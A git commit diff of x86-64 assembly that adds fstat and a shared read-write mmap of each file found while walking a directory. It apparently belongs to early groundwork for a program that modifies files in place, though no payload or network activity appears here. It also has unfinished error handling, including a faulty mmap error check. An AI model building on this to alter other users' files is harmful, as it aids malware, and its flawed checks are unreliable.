b5ceef7f5a39533a2f53d4036c061a7d530a2ccb
Damien <hubleur.damien333@protonmail.ch>
2024-10-12 15:19:27 +0200

    feat: map file

--- srcs/main.s
+++ srcs/main.s
@@ -3,12 +3,22 @@
 %define SYS_CLOSE 3
 %define SYS_EXIT 60
 %define SYS_GETDENTS64 217
+%define SYS_FSTAT 5
+%define SYS_MMAP 9
+%define SYS_MUNMAP 11
 
 %define O_RDONLY 0o
 %define O_RDWR 0o2
 
+%define	PROT_READ			0x1
+%define	PROT_WRITE			0x2
+%define	MAP_SHARED 			0x01
+%define	MMAP_ERRORS			-4095
+
 %define BUFFER_SIZE 1024
 %define PATH_MAX 4096
+; arbitrary TODO: change this
+%define MINIMAL_FILE_SIZE 100
 
 global _start
 
@@ -18,6 +28,25 @@ struc linux_dirent64
 	.d_reclen	resw	1
 	.d_type		resb	1
 	.d_name		resq	1
+endstruc
+
+struc	stat
+	.st_dev		resq	1	; ID of device containing file
+	.__pad1		resw	1	; Padding
+	.st_ino		resq	1	; Inode number
+	.st_mode	resd	1	; File type and mode
+	.st_nlink	resq	1	; Number of hard links
+	.st_uid		resd	1	; User ID of owner
+	.st_gid		resd	1	; Group ID of owner
+	.st_rdev	resq	1	; Device ID (if special file)
+	.__pad2		resw	1	; Padding
+	.st_size	resq	1	; Total size, in bytes
+	.st_blksize	resq	1	; Block size for filesystem I/O
+	.st_blocks	resq	1	; Number of 512B blocks allocated
+	.st_atim	resq	2	; Time of last access
+	.st_mtim	resq	2	; Time of last modification
+	.st_ctim	resq	2	; Time of last status change
+	.__unused	resq	3	; Unused
 endstruc
 
 section .text
@@ -144,8 +173,12 @@ treat_file:
 	%local filename:qword				; char const *file;
 	%local filepath:qword				; char *filepath;
 	%local fd:qword					; long fd;
-	%xdefine buf rbp - %$localsize - PATH_MAX	; uint8_t buf[PATH_MAX];
+	%local filesize:qword				; long filesize;
+	%local mappedfile:qword				; void *mappedfile;
+	%xdefine pathbuf rbp - %$localsize - PATH_MAX	; uint8_t pathbuf[PATH_MAX];
 	%assign %$localsize %$localsize + PATH_MAX	; ...
+	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
+	%assign %$localsize %$localsize + BUFFER_SIZE	; ...
 
 	; Initializes stack frame
 	push rbp
@@ -156,7 +189,7 @@ treat_file:
 	mov [filename], rsi				; filename = _filename;
 
 	; concat complete file path (TODO: check PATH_MAX overflow)
-	lea rdi, [buf]					; dest = buf;
+	lea rdi, [pathbuf]				; dest = pathbuf;
 	mov rsi, [dirname]				; src = dirname;
 	.dirname:
 		movsb					; *dest++ = *src++;
@@ -174,7 +207,7 @@ treat_file:
 
 	; Open file
 	mov rax, SYS_OPEN				; _ret = open(
-	lea rdi, [buf]					; path,
+	lea rdi, [pathbuf]				; path,
 	mov rsi, O_RDWR					; O_RDWR,
 	xor rdx, rdx					; 0
 	syscall						; );
@@ -182,9 +215,60 @@ treat_file:
 	jl .err						;	 goto .err
 	mov [fd], rax					; fd = _ret;
 
-	lea rdi, [buf]					
-	call print_string				; print_string(buf);
+	; Get file stat
+	lea rsi, [buf]					; _stat = buf;
+	mov rax, SYS_FSTAT				; _ret = fstat(
+	mov rdi, [fd]					; 	fd,
+	syscall						; _stat);
+	cmp rax, -1					; if (_ret == -1)
+	je .close_err					; 	goto .close_err
 
+	add rsi, stat.st_size				; filesize = _stat->st_size;
+	mov rax, [rsi]					; ...
+	mov [filesize], rax				; ...
+	cmp rax, MINIMAL_FILE_SIZE			; if (filesize < MINIMAL_FILE_SIZE)
+	jl .close_err					; 	goto .close_err
+
+	; Map file
+	mov rax, SYS_MMAP				; _ret = mmap(
+	mov rdi, 0					; 	0,
+	mov rsi, [filesize]				; 	filesize,
+	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
+	mov r10, MAP_SHARED				; 	MAP_SHARED,
+	mov r8, [fd]					; 	fd,
+	xor r9, r9					; 	0
+	syscall						; );
+	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
+	je .close_err					; 	goto .close_err
+	mov [mappedfile], rax				; mappedfile = _ret;
+
+
+	jmp .unmap_file
+
+; TODO Delete this
+.unmap_err:
+	mov rax, SYS_WRITE				; write(
+	mov rdi, 1					; 	1,
+	mov rsi, err_msg				; 	err_msg,
+	mov rdx, len_err_msg				; 	len_err_msg,
+	syscall						; );
+	jmp .unmap_file
+
+.unmap_file:
+	mov rax, SYS_MUNMAP				; _ret = munmap(
+	mov rdi, [mappedfile]				; 	mappedfile,
+	mov rsi, [filesize]				; 	filesize
+	syscall						; );
+	cmp rax, -1					; if (_ret == -1)
+	je .close_file					; 	goto .close_file
+
+; TODO Delete this
+.close_err:
+	mov rax, SYS_WRITE				; write(
+	mov rdi, 1					; 	1,
+	mov rsi, err_msg				; 	err_msg,
+	mov rdx, len_err_msg				; 	len_err_msg,
+	syscall						; );
 	jmp .close_file
 
 .close_file:
